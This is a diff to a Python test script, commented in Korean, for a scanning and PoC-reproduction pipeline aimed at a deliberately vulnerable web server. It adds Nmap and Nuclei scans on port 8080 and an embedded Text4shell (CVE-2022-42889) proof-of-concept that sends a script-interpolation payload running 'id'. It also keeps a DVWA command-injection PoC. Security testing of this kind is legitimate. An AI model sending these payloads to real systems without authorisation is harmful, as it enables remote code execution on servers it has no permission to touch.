@@ -63,7 +63,7 @@ def test_vulnerable_web_deployment(target_host: str):
     logger.info(f"  - Nmap 스캔 실행: {target_host}")
     nmap_result = scanner_pipeline.run_nmap_scan(
         target=target_host,
-        ports="22,80,443,3306",  # SSH, HTTP, HTTPS, MySQL
+        ports="22,80,443,3306,8080",  # SSH, HTTP, HTTPS, MySQL, Text4shell
         scan_type="-sV",
         save_to_db=True
     )
@@ -74,17 +74,40 @@ def test_vulnerable_web_deployment(target_host: str):
     
     logger.info(f"  ✓ Nmap 스캔 완료: {nmap_result.get('scan_id')}")
     
-    # Nuclei 스캔
-    logger.info(f"  - Nuclei 스캔 실행: {target_host}")
-    nuclei_result = scanner_pipeline.run_nuclei_scan(
+    # Nuclei 스캔 (포트 80)
+    logger.info(f"  - Nuclei 스캔 실행 (포트 80): http://{target_host}")
+    nuclei_result_80 = scanner_pipeline.run_nuclei_scan(
         target=f"http://{target_host}",
         save_to_db=True
     )
     
-    if nuclei_result.get("status") == "failed":
-        logger.warning(f"  ⚠ Nuclei 스캔 실패: {nuclei_result.get('error')}")
+    if nuclei_result_80.get("status") == "failed":
+        logger.warning(f"  ⚠ Nuclei 스캔 실패 (포트 80): {nuclei_result_80.get('error')}")
     else:
-        logger.info(f"  ✓ Nuclei 스캔 완료: {nuclei_result.get('scan_id')}")
+        logger.info(f"  ✓ Nuclei 스캔 완료 (포트 80): {nuclei_result_80.get('scan_id')}")
+    
+    # Nuclei 스캔 (포트 8080 - Text4shell)
+    logger.info(f"  - Nuclei 스캔 실행 (포트 8080 - Text4shell): http://{target_host}:8080")
+    nuclei_result_8080 = scanner_pipeline.run_nuclei_scan(
+        target=f"http://{target_host}:8080",
+        save_to_db=True
+    )
+    
+    if nuclei_result_8080.get("status") == "failed":
+        logger.warning(f"  ⚠ Nuclei 스캔 실패 (포트 8080): {nuclei_result_8080.get('error')}")
+    else:
+        logger.info(f"  ✓ Nuclei 스캔 완료 (포트 8080): {nuclei_result_8080.get('scan_id')}")
+        # Text4shell 탐지 확인
+        findings = nuclei_result_8080.get("findings", [])
+        text4shell_found = False
+        for finding in findings:
+            info = finding.get("info", {})
+            if "text4shell" in str(info).lower() or "CVE-2022-42889" in str(info):
+                text4shell_found = True
+                logger.info(f"  ✓ Text4shell (CVE-2022-42889) 탐지됨!")
+                break
+        if not text4shell_found:
+            logger.warning(f"  ⚠ Text4shell이 자동 탐지되지 않았습니다. 수동 PoC 테스트를 권장합니다.")
     
     # 스캔 결과 ID 조회
     with db.get_session() as session:
@@ -105,16 +128,66 @@ def test_vulnerable_web_deployment(target_host: str):
     logger.info("[3/4] PoC 재현 테스트")
     poc_pipeline = POCPipeline()
     
+    # Text4shell PoC (CVE-2022-42889)
+    logger.info(f"  - Text4shell PoC 테스트: http://{target_host}:8080")
+    text4shell_poc = f"""
+import sys
+import requests
+import urllib.parse
+
+target = "http://{target_host}:8080"
+# Text4shell 취약점 테스트: ${{script:javascript:java.lang.Runtime.getRuntime().exec('id')}}
+payload = urllib.parse.quote("${{script:javascript:java.lang.Runtime.getRuntime().exec('id')}}")
+
+try:
+    # GET /api/interpolate 엔드포인트 테스트
+    url = f"{{target}}/api/interpolate?input={{payload}}"
+    response = requests.get(url, timeout=10)
+    
+    # 명령 실행 결과 확인 (uid, gid 등이 포함되면 성공)
+    if response.status_code == 200:
+        if "uid=" in response.text or "gid=" in response.text or "root" in response.text.lower():
+            print("Text4shell (CVE-2022-42889) 취약점 확인됨")
+            print(f"응답: {{response.text[:200]}}")
+            sys.exit(0)
+        else:
+            print(f"Text4shell 테스트 응답: {{response.text[:200]}}")
+            sys.exit(1)
+    else:
+        print(f"HTTP {{response.status_code}}: {{response.text[:200]}}")
+        sys.exit(1)
+except Exception as e:
+    print(f"Text4shell PoC 실행 오류: {{e}}")
+    sys.exit(1)
+"""
+    
+    text4shell_result = poc_pipeline.run_poc_reproduction(
+        scan_result_id=scan_result_id,
+        poc_script=text4shell_poc,
+        poc_type="text4shell",
+        cve_id="CVE-2022-42889",
+        source="test",
+        collect_evidence=False,
+        target_host=target_host
+    )
+    
+    if text4shell_result.get("success"):
+        logger.info(f"  ✓ Text4shell PoC 재현 완료: {text4shell_result.get('reproduction_id')}")
+        logger.info(f"    상태: {text4shell_result.get('status')}")
+    else:
+        logger.warning(f"  ⚠ Text4shell PoC 재현 실패: {text4shell_result.get('error')}")
+    
     # Command Injection PoC
-    command_injection_poc = """
+    logger.info(f"  - Command Injection PoC 테스트: http://{target_host}/dvwa")
+    command_injection_poc = f"""
 import sys
 import requests
 
-target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost/dvwa"
+target = "http://{target_host}/dvwa"
 payload = "id"
 
 # Command Injection 테스트
-url = f"{target}/index.php?cmd={payload}"
+url = f"{{target}}/index.php?cmd={{payload}}"
 response = requests.get(url, timeout=5)
 
 if "uid=" in response.text or "gid=" in response.text:
@@ -125,20 +198,21 @@ else:
     sys.exit(1)
 """
     
-    poc_result = poc_pipeline.run_poc_reproduction(
+    command_injection_result = poc_pipeline.run_poc_reproduction(
         scan_result_id=scan_result_id,
         poc_script=command_injection_poc,
         poc_type="command_injection",
         cve_id="CWE-78",  # OS Command Injection
         source="test",
-        collect_evidence=False
+        collect_evidence=False,
+        target_host=target_host
     )
     
-    if poc_result.get("success"):
-        logger.info(f"  ✓ PoC 재현 완료: {poc_result.get('reproduction_id')}")
-        logger.info(f"    상태: {poc_result.get('status')}")
+    if command_injection_result.get("success"):
+        logger.info(f"  ✓ Command Injection PoC 재현 완료: {command_injection_result.get('reproduction_id')}")
+        logger.info(f"    상태: {command_injection_result.get('status')}")
     else:
-        logger.warning(f"  ⚠ PoC 재현 실패: {poc_result.get('error')}")
+        logger.warning(f"  ⚠ Command Injection PoC 재현 실패: {command_injection_result.get('error')}")
     
     logger.info("")
     
@@ -159,17 +233,50 @@ else:
 
 if __name__ == "__main__":
     import argparse
+    import re
     
-    parser = argparse.ArgumentParser(description="취약 웹 서버 배포 테스트")
+    parser = argparse.ArgumentParser(
+        description="취약 웹 서버 배포 테스트",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+사용 예시:
+  python scripts/test/test_vulnerable_web_deployment.py --target 13.125.220.26
+  python scripts/test/test_vulnerable_web_deployment.py --target http://13.125.220.26
+  python scripts/test/test_vulnerable_web_deployment.py --target example.com
+        """
+    )
     parser.add_argument(
         "--target",
         type=str,
         required=True,
-        help="취약 웹 서버 IP 주소 또는 도메인"
+        help="취약 웹 서버 IP 주소 또는 도메인 (예: 13.125.220.26 또는 http://13.125.220.26)"
     )
     
     args = parser.parse_args()
     
-    success = test_vulnerable_web_deployment(args.target)
+    # IP 주소 또는 도메인 검증
+    target = args.target.strip()
+    
+    # http:// 또는 https:// 제거 (IP/도메인만 추출)
+    if target.startswith("http://"):
+        target = target[7:]
+    elif target.startswith("https://"):
+        target = target[8:]
+    
+    # $ 기호 제거 (실수로 입력한 경우)
+    target = target.lstrip("$")
+    
+    # IP 주소 형식 검증 (간단한 검증)
+    ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
+    domain_pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$'
+    
+    if not (re.match(ip_pattern, target) or re.match(domain_pattern, target)):
+        logger.error(f"잘못된 대상 주소 형식: {args.target}")
+        logger.error("올바른 형식: IP 주소 (예: 13.125.220.26) 또는 도메인 (예: example.com)")
+        sys.exit(1)
+    
+    logger.info(f"대상 주소: {target} (원본: {args.target})")
+    
+    success = test_vulnerable_web_deployment(target)
     sys.exit(0 if success else 1)
 
